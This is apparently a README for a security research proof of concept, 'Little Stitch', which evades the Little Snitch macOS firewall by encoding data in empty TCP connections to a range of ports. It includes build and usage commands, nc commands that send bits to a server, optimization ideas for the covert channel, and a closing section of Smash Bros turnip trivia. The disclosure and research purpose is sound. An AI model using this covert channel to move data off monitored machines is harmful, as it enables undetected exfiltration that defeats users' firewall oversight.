# Little Stitch

Bypassing Little Snitch Firewall with Empty TCP Packets. The post that goes alongside this PoC on the [Rhino Security Labs Blog](https://rhinosecuritylabs.com/network-security/bypassing-little-snitch-firewall).

## Demo

https://user-images.githubusercontent.com/4079939/146304055-ddcbd09f-0379-4c49-af65-cb2de9fa979e.mov

## Usage

### Install

```
tag=$(curl -s https://api.github.com/repos/RhinoSecurityLabs/little-stitch/releases/latest|jq -r '.tag_name'|tr -d 'v')
curl -L "https://github.com/RhinoSecurityLabs/little-stitch/releases/download/v${tag}/little-stitch_${tag}_$(uname -s)_$(uname -m).tar.gz" \
    | tar -xzf - -C /usr/local/bin/ little-stitch
```

### Build

Make sure a recent version of GoLang is installed and set up (tested with golang 1.17.2).

```
go build -o little-stitch main.go
```


### Server

Currently, this PoC does not differentiate between clients so you'll likely want a firewall setup allowing ports
11100-11300 only from the client IP address. Other clients connecting to these ports while the server running
will change the output.

```
echo 'hello from server' | ./little-stitch server
```

### Client

You'll want to start the server before the client, you may get unexpected results if you start the client first.

```
echo 'hello from client' | ./little-stitch client <server ip address>
```

## Bypassing Little Snitch Firewall with Empty TCP Packets

Little Snitch does not trigger an alert when a TCP connection is established but instead is triggered
when application data is sent across the connection. So if you set up a TCP connection and immediately close it,
before sending any data across it, an alert will not be triggered by Little Snitch.

You can test this without installing anything on your computer with the nc command.

Note: For unknown reasons, Little Snitch alerting seems to be inconsistent when netcat is used like this. If you
are getting alerts with the following commands you may have more success with the PoC, which is more reliable.

```
% nc -G 2 -vz 1.1.1.1 80
Connection to 1.1.1.1 port 80 [tcp/http] succeeded!
% nc -G 2 -vz 1.1.1.1 81
nc: connectx to 1.1.1.1 port 81 (tcp) failed: Operation timed out
```

While we aren't sending any data across the connection, this behavior alone is enough to enable two-way
communications between a server and a client running behind Little Snitch without being detected.

## Implementation Details

For exfiling data to an attacker-controlled server, instead of sending data across the TCP connection as
application data, we want to encode our data as attributes of the TCP/IP connection. These attributes should
be modifiable by an underprivileged user, and be readable by the server without affecting routing.

There are several attributes of a TCP connection that fill these requirements, however the most
straightforward is the destination port number, and whether a connection is opened or not. If we
are trying to send a byte at a time to the server we can use a range of 8 destination ports each
representing a bit in the current byte. We can then have an initiated connection represent a one while
doing nothing represents a zero, so essentially whether a connection is opened or not in the current
cycle represents a single bit. Once we have made all the connections needed we can then send a connection
to a ninth port, indicating to the server the current cycle is complete.

We can run through this manually to get a better idea of what is happening here by just running the server-side
of the connection and using `nc` to open the connections which will set (poke) the bits on the server.

```
./little-stitch server
```

With the server running we can take a look at the bit's needed to represent an ASCII `A`.

```
$ echo -n 'A' | xxd -b
00000000: 01000001                                               A
```

From the output of `xxd` we can see, if we are counting from right to left (assuming you are using a little-endian
system) bits 1 and 7 are set. So to print an 'A' we'll want to poke ports 11101 and 11107, following up with a 11100
to flush the byte to stdout.

```
% nc -vz 34.125.141.146 11101
Connection to 34.125.141.146 port 11101 [tcp/*] succeeded!
% nc -vz 34.125.141.146 11107
Connection to 34.125.141.146 port 11107 [tcp/*] succeeded!
% nc -vz 34.125.141.146 11100
Connection to 34.125.141.146 port 11100 [tcp/*] succeeded!
```

If we look at the server we'll see the following.

```
$ ./little-stitch
A
```

Sending data the other direction isn't as simple since we can't send data directly from the server to the client, which will
most likely be on a network restricted with NAT. So instead of poking ports when we need to represent the value of a
given bit, we'll instead open the ports on the server corresponding to the set bits of the current byte. The client can
then iterate over these ports and record whether they were opened or closed to determine the value of the current byte.
In the demo we can see that this is slower than sending data to the server, this is because the client has more ports
overall to check (currently this is unoptimized, and closing the connection eats up a fair amount of time) and because
the server and the client need to be more careful about remaining in sync during this process.

## Transfer Speed

This unoptimized proof of concept is very low bandwidth, based on observations it appears to be able to upload at about 16 bit/s
and download at about 8 bit/s. Currently, the majority of time is spent waiting on TCP connections to close and because everything is run
serialized this ends up slowing things down quite a bit. Listed below are a few possible optimizations along with the estimated
speed up (these are very rough, and may not even work as expected, so take this with a grain of salt).

* Encoding data in the source port.
  * Estimated speed up: 2x
* Use the whole port range for data e.g. open port 65 to represent ascii character 'A'.
  * Suggested by [@arkadiyt](https://twitter.com/arkadiyt), thanks!
  * Estimated speed up: Somewhere between 4x and 16x, but only for upload speeds. To download data we need to iterate all the possible ports that can
    be opened so keeping the number of ports small helps with throughput. We can of course take both approaches though and reserve the top X ports. To
    get the 16x speed up we would need to make up for those missing bits somewhere else though.
* Use NFQUEUE on the server to read Syn packets sent by the client without opening a full TCP connection.
  * Estimated speed up: 5x, maybe more, at the cost of reliable transfers. This is because each connection needs to
    go through the full TCP handshake and teardown process. This results in 5 packets per connection (SYN, SYN/ACK, ACK, client
    FIN/ACK, server FIN/ACK).
* Parallelizing data transfer and compression.
  * Estimated speed up: ?
* Use TCP OOB flag for data.
  * Estimated speed up: 1 bit per connection.
* Use TCP Urgent flag for data.
  * Estimated speed up: 1 bit per connection.


## What's with the Little Stitch name?

Snitch sounds like stitch, and little-stitch reminds me of Stitch Face, which is Peach's ultimate turnip in Smash Bro's Melee. Anyways, since
you seem to be so interested in Peach's turnips now, the rest of this README is about them.

Peaches turnips come in many variations and typically do 2%-10% damage when thrown. The Stitch Face Turnip is unique however, it is one of the
two rarest turnips in the game with only a 1.711% chance of appearing with each pull. What puts it apart from the other turnips isn't its
rarity however, it's the punch it packs at 34% damage, making it the most powerful item that is legal in tournament play.

Turnip Tip: after you throw it and it hits your opponent try recatching it by jumping and pressing Z when the turnip bounces back and passes
through peaches body onscreen.

### Turnip Stats

| Turnip Name | Damage      | Probability |
| ----------- | ----------- |-------------|
| Normal      | 6 %         | 59.873 %    |
| Eybrow Eyes | 6 %         | 10.264 %    |
| Line Eyes   | 6 %         | 8.553 %     |
| Circle Eyes | 6 %         | 5.132 %     |
| Carrot Eyes | 6 %         | 5.132 %     |
| Wink        | 10 %        | 6.843 %     |
| Dot Eyes    | 16 %        | 1.711 %     |
| Stitch Face | 34 %        | 1.711 %     |
